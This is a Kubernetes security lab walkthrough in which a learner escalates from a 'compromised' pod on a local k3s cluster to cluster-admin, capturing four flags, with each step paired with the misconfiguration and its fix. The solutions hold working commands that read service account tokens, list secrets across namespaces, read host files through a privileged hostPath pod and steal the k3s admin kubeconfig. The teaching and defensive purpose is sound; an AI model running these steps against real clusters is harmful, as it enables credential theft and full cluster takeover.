# Attack Scenario: Compromise the Cluster

A hands-on attack simulation where you exploit common Kubernetes misconfigurations to capture flags. Everything runs locally on your k3s cluster.

## Scenario Background

You've gained initial access to a pod in a company's Kubernetes cluster (imagine this happened via an application vulnerability like RCE in a web app). Your goal is to escalate privileges and find sensitive data.

**Your objectives:**

1. **Flag 1:** Find the database password
2. **Flag 2:** Read a secret from another namespace
3. **Flag 3:** Escape to the host node
4. **Flag 4:** Gain cluster-admin access

**Rules:**
- Start only from the initial "compromised" pod
- Use only tools available in the cluster
- Document the misconfigurations you exploit

---

## Setup

### Deploy the Vulnerable Environment

Save this script and run it to set up the attack scenario:

```bash
chmod +x attack-scenario-setup.sh
./attack-scenario-setup.sh
```

Or apply manually:

```bash
# Create the setup (copy from attack-scenario-setup.sh or run it directly)
kubectl apply -f attack-scenario-manifests.yaml
```

### Access Your Starting Point

Once deployed, exec into the "compromised" web application pod:

```bash
# This is your initial foothold
kubectl exec -it -n webapp deploy/vulnerable-app -- /bin/bash
```

You're now an attacker with shell access to a pod. Begin your reconnaissance.

---

## Attack Walkthrough

Work through these challenges in order. Try to solve each one before reading the hints!

---

### Flag 1: Find the Database Password

**Objective:** Find credentials for the database.

**Starting point:** You're inside the `vulnerable-app` pod.

<details>
<summary>Hint 1</summary>

What environment variables are set in this container? Applications often have credentials passed in as env vars.

</details>

<details>
<summary>Hint 2</summary>

```bash
env | grep -i pass
env | grep -i secret
env | grep -i db
```

</details>

<details>
<summary>Solution</summary>

```bash
# Check environment variables
env

# You should find:
# DB_PASSWORD=flag1-sup3r-s3cr3t-passw0rd
```

**Misconfiguration exploited:** Sensitive credentials passed as environment variables. These can be seen by anyone with `exec` access to the pod, appear in `kubectl describe pod`, and may be logged.

**Better practice:** Use Kubernetes secrets mounted as files, or external secret managers.

</details>

---

### Flag 2: Access Another Namespace's Secrets

**Objective:** Read secrets from the `payments` namespace.

**Starting point:** Still inside the `vulnerable-app` pod.

<details>
<summary>Hint 1</summary>

Check if there's a service account token mounted in this pod. Where are service account tokens typically found?

</details>

<details>
<summary>Hint 2</summary>

```bash
# Check for mounted service account
ls -la /var/run/secrets/kubernetes.io/serviceaccount/

# Get the token
cat /var/run/secrets/kubernetes.io/serviceaccount/token
```

</details>

<details>
<summary>Hint 3</summary>

You can interact with the Kubernetes API from inside a pod. The API server is available at `https://kubernetes.default.svc`. Use `curl` with the service account token.

```bash
# Set up variables
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
CACERT=/var/run/secrets/kubernetes.io/serviceaccount/ca.crt
APISERVER=https://kubernetes.default.svc

# Test API access
curl --cacert $CACERT -H "Authorization: Bearer $TOKEN" $APISERVER/api/v1/namespaces
```

</details>

<details>
<summary>Solution</summary>

```bash
# Set up API access
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
CACERT=/var/run/secrets/kubernetes.io/serviceaccount/ca.crt
APISERVER=https://kubernetes.default.svc

# First, check what permissions we have
# List secrets in the payments namespace
curl -s --cacert $CACERT -H "Authorization: Bearer $TOKEN" \
  $APISERVER/api/v1/namespaces/payments/secrets

# Get the specific secret
curl -s --cacert $CACERT -H "Authorization: Bearer $TOKEN" \
  $APISERVER/api/v1/namespaces/payments/secrets/payment-api-key | grep -o '"api-key":"[^"]*"'

# Decode the base64 value
echo "ZmxhZzItcGF5bWVudC1hcGkta2V5LTEyMzQ1" | base64 -d
# Output: flag2-payment-api-key-12345
```

**Misconfiguration exploited:** The service account has permissions to read secrets across namespaces. This violates the principle of least privilege.

**Better practice:** 
- Use namespace-scoped Roles, not ClusterRoles
- Only grant `get` on specific secrets if needed, never `list` on all secrets
- Disable auto-mounting of service account tokens when not needed

</details>

---

### Flag 3: Escape to the Host

**Objective:** Read a file from the host node's filesystem.

**Starting point:** Look for another pod you can leverage.

<details>
<summary>Hint 1</summary>

Check what other pods are running in the `webapp` namespace. One of them might have dangerous security settings.

```bash
# From inside the pod, query the API
curl -s --cacert $CACERT -H "Authorization: Bearer $TOKEN" \
  $APISERVER/api/v1/namespaces/webapp/pods | grep '"name"'
```

</details>

<details>
<summary>Hint 2</summary>

There's a "debug" pod that's been left running. Check its security context — is it running as privileged? Does it have host mounts?

```bash
# Get the debug pod's spec
curl -s --cacert $CACERT -H "Authorization: Bearer $TOKEN" \
  $APISERVER/api/v1/namespaces/webapp/pods/debug-pod | grep -A5 -i "privileged\|hostpath"
```

</details>

<details>
<summary>Hint 3</summary>

You have permissions to exec into other pods. The debug pod has the host filesystem mounted.

</details>

<details>
<summary>Solution</summary>

From your attacking machine (not from inside the pod):

```bash
# Exit the current pod first (or open new terminal)
exit

# Exec into the privileged debug pod
kubectl exec -it -n webapp debug-pod -- /bin/sh

# The host filesystem is mounted at /host
ls /host

# Read the flag from the host
cat /host/etc/flag3.txt
# Output: flag3-h0st-f1l3syst3m-acc3ss

# You could also access:
# - /host/etc/kubernetes/pki/ (cluster PKI)
# - /host/var/lib/kubelet/ (kubelet data)
# - /host/root/ (root user's home)
```

**Misconfiguration exploited:** 
1. Privileged container running in the cluster
2. Host filesystem mounted into the container
3. Debug pods left running in production

**Better practice:**
- Never run privileged containers in production
- Never mount the host filesystem (especially `/`)
- Remove debug/troubleshooting pods when done
- Use Pod Security Admission to block privileged pods

</details>

---

### Flag 4: Gain Cluster-Admin Access

**Objective:** Obtain full cluster-admin privileges.

**Starting point:** The privileged debug pod from Flag 3.

<details>
<summary>Hint 1</summary>

From a privileged pod with host access, you can access node-level credentials. Where does kubelet store its configuration?

</details>

<details>
<summary>Hint 2</summary>

On k3s, the kubeconfig with admin credentials is stored at `/etc/rancher/k3s/k3s.yaml` on the host.

</details>

<details>
<summary>Hint 3</summary>

Once you have the kubeconfig, you need to modify the server address to be accessible. Inside the pod, the API server is at `https://kubernetes.default.svc:443`.

</details>

<details>
<summary>Solution</summary>

From inside the debug pod:

```bash
# Read the k3s kubeconfig from the host
cat /host/etc/rancher/k3s/k3s.yaml

# Copy it and modify for use inside the pod
cp /host/etc/rancher/k3s/k3s.yaml /tmp/admin.yaml

# The kubeconfig points to 127.0.0.1:6443 which won't work from the pod
# Change it to the internal service address
sed -i 's|127.0.0.1|kubernetes.default.svc|g' /tmp/admin.yaml

# Install kubectl (if not present)
apk add --no-cache curl
curl -LO "https://dl.k8s.io/release/$(curl -sL https://dl.k8s.io/release/stable.txt)/bin/linux/amd64/kubectl"
chmod +x kubectl

# Use the admin kubeconfig
export KUBECONFIG=/tmp/admin.yaml

# Verify cluster-admin access
./kubectl auth can-i '*' '*'
# Output: yes

# Get the final flag
./kubectl get secret -n kube-system cluster-admin-flag -o jsonpath='{.data.flag}' | base64 -d
# Output: flag4-full-cluster-compromise

# You now have complete control
./kubectl get nodes
./kubectl get secrets -A
./kubectl get pods -A
```

**Misconfiguration exploited:**
1. Privileged container allowed host filesystem access
2. Node credentials accessible from compromised container
3. No additional protection on admin credentials

**Better practice:**
- Never allow privileged containers
- Use Pod Security Admission to enforce restrictions
- Consider node-level security (SELinux, AppArmor)
- Use short-lived credentials and audit logs
- Network policies to restrict pod-to-API-server access

</details>

---

## Attack Chain Summary

```
┌─────────────────────────────────────────────────────────────────────┐
│                        ATTACK PROGRESSION                           │
└─────────────────────────────────────────────────────────────────────┘

┌──────────────┐    ┌───────────────┐    ┌──────────────┐    ┌────────────────┐
│ Initial      │───▶│ Service Acct  │───▶│ Privileged   │───▶│ Cluster        │
│ Foothold     │    │ Token Abuse   │    │ Container    │    │ Admin          │
│              │    │               │    │              │    │                │
│ • App pod    │    │ • Read other  │    │ • Mount host │    │ • Steal node   │
│ • Env vars   │    │   namespace   │    │   filesystem │    │   credentials  │
│   exposed    │    │   secrets     │    │ • Escape     │    │ • Full control │
│              │    │               │    │   container  │    │                │
│ [Flag 1]     │    │ [Flag 2]      │    │ [Flag 3]     │    │ [Flag 4]       │
└──────────────┘    └───────────────┘    └──────────────┘    └────────────────┘
```

---

## Misconfigurations Summary

| Flag | Vulnerability | Impact | Prevention |
|------|--------------|--------|------------|
| 1 | Secrets in env vars | Credential exposure | Use mounted secrets or external vaults |
| 2 | Overly permissive RBAC | Cross-namespace access | Least privilege, namespace-scoped roles |
| 3 | Privileged pod + hostPath | Container escape | Pod Security Admission, no privileged pods |
| 4 | Host credential access | Full cluster takeover | Defense in depth, node hardening |

---

## Cleanup

Remove all attack scenario resources:

```bash
./attack-scenario-cleanup.sh
```

Or manually:

```bash
kubectl delete namespace webapp payments
kubectl delete clusterrole webapp-overprivileged
kubectl delete clusterrolebinding webapp-overprivileged-binding
sudo rm -f /etc/flag3.txt
```

---

## Defending Against These Attacks

Now that you've seen how these attacks work, here's how to prevent them:

### 1. Prevent Credential Exposure (Flag 1)
```yaml
# Mount secrets as files, not env vars
spec:
  containers:
  - name: app
    volumeMounts:
    - name: db-creds
      mountPath: /etc/secrets
      readOnly: true
  volumes:
  - name: db-creds
    secret:
      secretName: db-credentials
```

### 2. Lock Down RBAC (Flag 2)
```yaml
# Use namespace-scoped Roles, not ClusterRoles
kind: Role  # Not ClusterRole!
metadata:
  namespace: webapp  # Scoped to one namespace
rules:
- apiGroups: [""]
  resources: ["configmaps"]  # Only what's needed
  verbs: ["get"]  # Minimum permissions
```

### 3. Disable Auto-Mounted Tokens
```yaml
# If pod doesn't need API access
spec:
  automountServiceAccountToken: false
```

### 4. Enforce Pod Security (Flag 3)
```yaml
# Apply to namespace
apiVersion: v1
kind: Namespace
metadata:
  name: webapp
  labels:
    pod-security.kubernetes.io/enforce: restricted
```

### 5. Network Policies
```yaml
# Restrict API server access
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: deny-metadata-and-api
spec:
  podSelector: {}
  policyTypes:
  - Egress
  egress:
  - to:
    - ipBlock:
        cidr: 0.0.0.0/0
        except:
        - 169.254.169.254/32  # Cloud metadata
        # Add API server IP to block internal API access
```

---

## Next Steps

1. **Fix the vulnerabilities** — Modify the manifests to be secure and verify the attacks no longer work
2. **Try Kubernetes Goat** — More advanced scenarios at https://github.com/madhuakula/kubernetes-goat
3. **Learn Falco** — Set up runtime detection for these attack patterns
4. **CIS Benchmarks** — Run kube-bench to find other issues
